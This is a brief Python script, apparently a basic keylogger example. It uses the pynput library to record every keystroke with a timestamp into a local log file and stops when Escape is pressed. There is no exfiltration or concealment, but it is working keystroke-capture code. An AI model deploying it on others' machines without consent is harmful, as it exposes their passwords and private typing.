# Library
from pynput.keyboard import Key, Listener
# Vanilla
import logging

# Make a log file
log_dir = ''

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s %(message)s:')

def on_press(key):
    logging.info(str(key))
    # Stop logger with escape key 
    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()
